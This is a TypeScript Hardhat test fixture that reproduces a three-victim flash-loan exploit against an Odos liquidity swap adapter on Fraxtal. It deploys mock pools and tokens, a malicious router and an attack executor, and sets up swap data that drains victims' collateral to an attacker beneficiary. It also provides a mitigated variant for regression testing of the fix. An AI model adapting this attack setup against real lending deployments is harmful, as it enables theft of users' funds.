import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { ethers } from "hardhat";
import {
  DECIMALS,
  FLASH_MINT,
  VICTIM_1_DUSD,
  VICTIM_2_SFRXETH,
  VICTIM_3_SUSDE,
} from "../helpers/attackConstants";

/**
 * Fixture interface for three-victim Fraxtal exploit
 *
 * This fixture sets up the complete environment for reproducing the Fraxtal attack:
 * - Three victims with three different collateral types (dUSD, sfrxETH, sUSDe)
 * - Mock pool with flash-loan capabilities
 * - Malicious Odos router that can execute three sequential swaps
 * - Attack executor contract that orchestrates the entire exploit
 */
export interface FraxtalOdosV1ExploitFixture {
  // Signers
  deployer: HardhatEthersSigner;
  victim1: HardhatEthersSigner; // dUSD collateral victim
  victim2: HardhatEthersSigner; // sfrxETH collateral victim
  victim3: HardhatEthersSigner; // sUSDe collateral victim
  attacker: HardhatEthersSigner;
  attackerBeneficiary: HardhatEthersSigner;
  reserveManager: HardhatEthersSigner;

  // Core contracts
  pool: any; // StatefulMockPool
  addressesProvider: any; // MockPoolAddressesProvider
  priceOracle: any; // MockPriceOracleGetterV2
  router: any; // MaliciousOdosRouterV2
  attackExecutor: any; // ThreeVictimAttackExecutor
  adapter: any; // OdosLiquiditySwapAdapter

  // Collateral tokens (underlying)
  dusd: any; // TestMintableERC20 (6 decimals)
  sfrxeth: any; // TestMintableERC20 (18 decimals)
  susde: any; // TestMintableERC20 (18 decimals)

  // aTokens
  aDusd: any; // MockAToken (6 decimals)
  aSfrxeth: any; // MockAToken (18 decimals)
  aSusde: any; // MockAToken (18 decimals)
}

/**
 * Deploys the complete Fraxtal Odos exploit fixture
 *
 * Sets up three victims with different collateral types and all necessary infrastructure
 * for reproducing the three-victim atomic attack
 */
async function deployFraxtalOdosV1BaseFixture(
  adapterContractName: string
): Promise<FraxtalOdosV1ExploitFixture> {
  const [deployer, victim1, victim2, victim3, attacker, attackerBeneficiary, reserveManager] =
    await ethers.getSigners();

  // Deploy core pool infrastructure
  const PoolFactory = await ethers.getContractFactory("StatefulMockPool");
  const pool = await PoolFactory.deploy();

  const PriceOracleFactory = await ethers.getContractFactory("MockPriceOracleGetterV2");
  const priceOracle = await PriceOracleFactory.deploy();

  const AddressesProviderFactory = await ethers.getContractFactory("MockPoolAddressesProvider");
  const addressesProvider = await AddressesProviderFactory.deploy(
    await pool.getAddress(),
    await priceOracle.getAddress()
  );

  // Deploy collateral tokens with correct decimals
  const TokenFactory = await ethers.getContractFactory("TestMintableERC20");
  const dusd = await TokenFactory.deploy("Degen USD", "dUSD", DECIMALS.DUSD); // 6 decimals on Fraxtal
  const sfrxeth = await TokenFactory.deploy("Staked Frax Ether", "sfrxETH", DECIMALS.SFRXETH);
  const susde = await TokenFactory.deploy("Staked USDe", "sUSDe", DECIMALS.SUSDE);

  // Deploy aTokens (use fully qualified name to avoid conflicts)
  const MockATokenFactory = await ethers.getContractFactory("contracts/testing/odos/MockAToken.sol:MockAToken");
  const aDusd = await MockATokenFactory.deploy(
    "dLend dUSD",
    "adUSD",
    DECIMALS.DUSD,
    await pool.getAddress()
  );
  const aSfrxeth = await MockATokenFactory.deploy(
    "dLend sfrxETH",
    "asfrxETH",
    DECIMALS.SFRXETH,
    await pool.getAddress()
  );
  const aSusde = await MockATokenFactory.deploy(
    "dLend sUSDe",
    "asUSDe",
    DECIMALS.SUSDE,
    await pool.getAddress()
  );

  // Configure pool reserve data for all three collateral types
  await pool.setReserveData(
    await dusd.getAddress(),
    await aDusd.getAddress(),
    ethers.ZeroAddress,
    ethers.ZeroAddress
  );
  await pool.setReserveData(
    await sfrxeth.getAddress(),
    await aSfrxeth.getAddress(),
    ethers.ZeroAddress,
    ethers.ZeroAddress
  );
  await pool.setReserveData(
    await susde.getAddress(),
    await aSusde.getAddress(),
    ethers.ZeroAddress,
    ethers.ZeroAddress
  );

  // Deploy malicious router
  const RouterFactory = await ethers.getContractFactory("MaliciousOdosRouterV2");
  const router = await RouterFactory.deploy();

  // Deploy adapter
  const AdapterFactory = await ethers.getContractFactory(adapterContractName);
  const adapter = await AdapterFactory.deploy(
    await addressesProvider.getAddress(),
    await pool.getAddress(),
    await router.getAddress(),
    deployer.address
  );

  // Impersonate adapter to approve router allowances (replicates production setup)
  const adapterAddress = await adapter.getAddress();
  const routerAddress = await router.getAddress();
  await ethers.provider.send("hardhat_setBalance", [adapterAddress, "0x56BC75E2D63100000"]); // 1 ETH
  const adapterSigner = await ethers.getImpersonatedSigner(adapterAddress);
  await dusd.connect(adapterSigner).approve(routerAddress, ethers.MaxUint256);
  await sfrxeth.connect(adapterSigner).approve(routerAddress, ethers.MaxUint256);
  await susde.connect(adapterSigner).approve(routerAddress, ethers.MaxUint256);

  // Deploy three-victim attack executor
  const AttackExecutorFactory = await ethers.getContractFactory("ThreeVictimAttackExecutor");
  const attackExecutor = await AttackExecutorFactory.deploy(
    [await dusd.getAddress(), await sfrxeth.getAddress(), await susde.getAddress()],
    await dusd.getAddress(),
    await router.getAddress(),
    await adapter.getAddress(),
    attackerBeneficiary.address
  );

  await attackExecutor.transferOwnership(attacker.address);
  await attackExecutor.connect(attacker).setPool(await pool.getAddress());

  // Seed dust balances so the malicious router can refund 1-unit credits during swaps
  await dusd.mint(await attackExecutor.getAddress(), VICTIM_1_DUSD.DUST_OUTPUT);
  await sfrxeth.mint(await attackExecutor.getAddress(), VICTIM_2_SFRXETH.DUST_OUTPUT);
  await susde.mint(await attackExecutor.getAddress(), VICTIM_3_SUSDE.DUST_OUTPUT);

  // Configure attacker burst amounts to forward drained collateral to beneficiary
  await attackExecutor
    .connect(attacker)
    .setBurstAmounts([
      VICTIM_1_DUSD.FLASH_SWAP_AMOUNT,
      VICTIM_2_SFRXETH.FLASH_SWAP_AMOUNT,
      VICTIM_3_SUSDE.FLASH_SWAP_AMOUNT,
    ]);

  // Mint collateral to victims and have them supply to pool
  // Victim 1: dUSD
  await dusd.mint(victim1.address, VICTIM_1_DUSD.COLLATERAL_TO_SWAP);
  await dusd.connect(victim1).approve(await pool.getAddress(), VICTIM_1_DUSD.COLLATERAL_TO_SWAP);
  await pool
    .connect(victim1)
    .supply(await dusd.getAddress(), VICTIM_1_DUSD.COLLATERAL_TO_SWAP, victim1.address, 0);

  // Victim 2: sfrxETH
  await sfrxeth.mint(victim2.address, VICTIM_2_SFRXETH.COLLATERAL_TO_SWAP);
  await sfrxeth
    .connect(victim2)
    .approve(await pool.getAddress(), VICTIM_2_SFRXETH.COLLATERAL_TO_SWAP);
  await pool
    .connect(victim2)
    .supply(await sfrxeth.getAddress(), VICTIM_2_SFRXETH.COLLATERAL_TO_SWAP, victim2.address, 0);

  // Victim 3: sUSDe
  await susde.mint(victim3.address, VICTIM_3_SUSDE.COLLATERAL_TO_SWAP);
  await susde.connect(victim3).approve(await pool.getAddress(), VICTIM_3_SUSDE.COLLATERAL_TO_SWAP);
  await pool
    .connect(victim3)
    .supply(await susde.getAddress(), VICTIM_3_SUSDE.COLLATERAL_TO_SWAP, victim3.address, 0);

  // Seed additional pool liquidity for sfrxETH and sUSDe to cover flash-loan withdrawal overlap
  await sfrxeth.mint(
    await pool.getAddress(),
    VICTIM_2_SFRXETH.COLLATERAL_TO_SWAP
  );
  await susde.mint(
    await pool.getAddress(),
    VICTIM_3_SUSDE.COLLATERAL_TO_SWAP
  );

  // Mint reserve manager collateral (for flash loan premiums across all three victims)
  const totalReservePremiums =
    VICTIM_1_DUSD.FLASH_LOAN_PREMIUM +
    VICTIM_2_SFRXETH.FLASH_LOAN_PREMIUM +
    VICTIM_3_SUSDE.FLASH_LOAN_PREMIUM;

  // For simplicity in the mock, we'll provide reserve manager with dUSD equivalent
  // In production, reserve manager would have collateral for each asset type
  await dusd.mint(reserveManager.address, totalReservePremiums);
  await dusd.connect(reserveManager).approve(await pool.getAddress(), totalReservePremiums);
  await pool
    .connect(reserveManager)
    .supply(await dusd.getAddress(), totalReservePremiums, reserveManager.address, 0);

  // Mint flash-mint amount to pool for dUSD flash-loan capability
  await dusd.mint(await pool.getAddress(), FLASH_MINT.AMOUNT);

  // Configure router behavior for each victim's swap
  // Victim 1: dUSD -> dUSD (same-asset dust)
  await router.setSwapBehaviourWithDust(
    await dusd.getAddress(),
    await dusd.getAddress(),
    VICTIM_1_DUSD.FLASH_SWAP_AMOUNT,
    VICTIM_1_DUSD.DUST_OUTPUT,
    false, // same asset
    await attackExecutor.getAddress()
  );

  // Victim 2: sfrxETH -> sfrxETH (same-asset dust)
  await router.setSwapBehaviourWithDust(
    await sfrxeth.getAddress(),
    await sfrxeth.getAddress(),
    VICTIM_2_SFRXETH.FLASH_SWAP_AMOUNT,
    VICTIM_2_SFRXETH.DUST_OUTPUT,
    false, // same asset
    await attackExecutor.getAddress()
  );

  // Victim 3: sUSDe -> sUSDe (same-asset dust)
  await router.setSwapBehaviourWithDust(
    await susde.getAddress(),
    await susde.getAddress(),
    VICTIM_3_SUSDE.FLASH_SWAP_AMOUNT,
    VICTIM_3_SUSDE.DUST_OUTPUT,
    false, // same asset
    await attackExecutor.getAddress()
  );

  return {
    deployer,
    victim1,
    victim2,
    victim3,
    attacker,
    attackerBeneficiary,
    reserveManager,
    pool,
    addressesProvider,
    priceOracle,
    router,
    attackExecutor,
    adapter,
    dusd,
    sfrxeth,
    susde,
    aDusd,
    aSfrxeth,
    aSusde,
  };
}

export async function deployFraxtalOdosV1ExploitFixture(): Promise<FraxtalOdosV1ExploitFixture> {
  return deployFraxtalOdosV1BaseFixture("LegacyOdosLiquiditySwapAdapter");
}

export async function deployFraxtalOdosV1MitigatedFixture(): Promise<FraxtalOdosV1ExploitFixture> {
  return deployFraxtalOdosV1BaseFixture("OdosLiquiditySwapAdapter");
}

/**
 * Creates malicious swap data for the Odos router
 *
 * This encodes a call to the router's performSwap function, which will
 * route collateral through the attacker executor
 */
export function createMaliciousSwapData(router: any): string {
  return router.interface.encodeFunctionData("performSwap");
}

/**
 * Helper to create liquiditySwapParams for a specific victim
 */
export function createLiquiditySwapParams(
  collateralAsset: string,
  collateralAmountToSwap: bigint,
  newCollateralAsset: string,
  newCollateralAmount: bigint,
  userAddress: string,
  withFlashLoan: boolean,
  swapData: string
) {
  return {
    collateralAsset,
    collateralAmountToSwap,
    newCollateralAsset,
    newCollateralAmount,
    user: userAddress,
    withFlashLoan,
    swapData,
  };
}

/**
 * Helper to create empty permit input (not used in attack)
 */
export function createEmptyPermitInput(aTokenAddress: string) {
  return {
    aToken: aTokenAddress,
    value: 0n,
    deadline: 0n,
    v: 0,
    r: ethers.ZeroHash,
    s: ethers.ZeroHash,
  };
}

// Export constant values for convenience
export const DUSD_DECIMALS = DECIMALS.DUSD;
export const SFRXETH_DECIMALS = DECIMALS.SFRXETH;
export const SUSDE_DECIMALS = DECIMALS.SUSDE;

export const FLASH_MINT_AMOUNT = FLASH_MINT.AMOUNT;

export const VICTIM_1_COLLATERAL_TO_SWAP = VICTIM_1_DUSD.COLLATERAL_TO_SWAP;
export const VICTIM_1_DUST_OUTPUT = VICTIM_1_DUSD.DUST_OUTPUT;
export const VICTIM_1_FLASH_SWAP_AMOUNT = VICTIM_1_DUSD.FLASH_SWAP_AMOUNT;
export const VICTIM_1_FLASH_LOAN_PREMIUM = VICTIM_1_DUSD.FLASH_LOAN_PREMIUM;

export const VICTIM_2_COLLATERAL_TO_SWAP = VICTIM_2_SFRXETH.COLLATERAL_TO_SWAP;
export const VICTIM_2_DUST_OUTPUT = VICTIM_2_SFRXETH.DUST_OUTPUT;
export const VICTIM_2_FLASH_SWAP_AMOUNT = VICTIM_2_SFRXETH.FLASH_SWAP_AMOUNT;
export const VICTIM_2_FLASH_LOAN_PREMIUM = VICTIM_2_SFRXETH.FLASH_LOAN_PREMIUM;

export const VICTIM_3_COLLATERAL_TO_SWAP = VICTIM_3_SUSDE.COLLATERAL_TO_SWAP;
export const VICTIM_3_DUST_OUTPUT = VICTIM_3_SUSDE.DUST_OUTPUT;
export const VICTIM_3_FLASH_SWAP_AMOUNT = VICTIM_3_SUSDE.FLASH_SWAP_AMOUNT;
export const VICTIM_3_FLASH_LOAN_PREMIUM = VICTIM_3_SUSDE.FLASH_LOAN_PREMIUM;
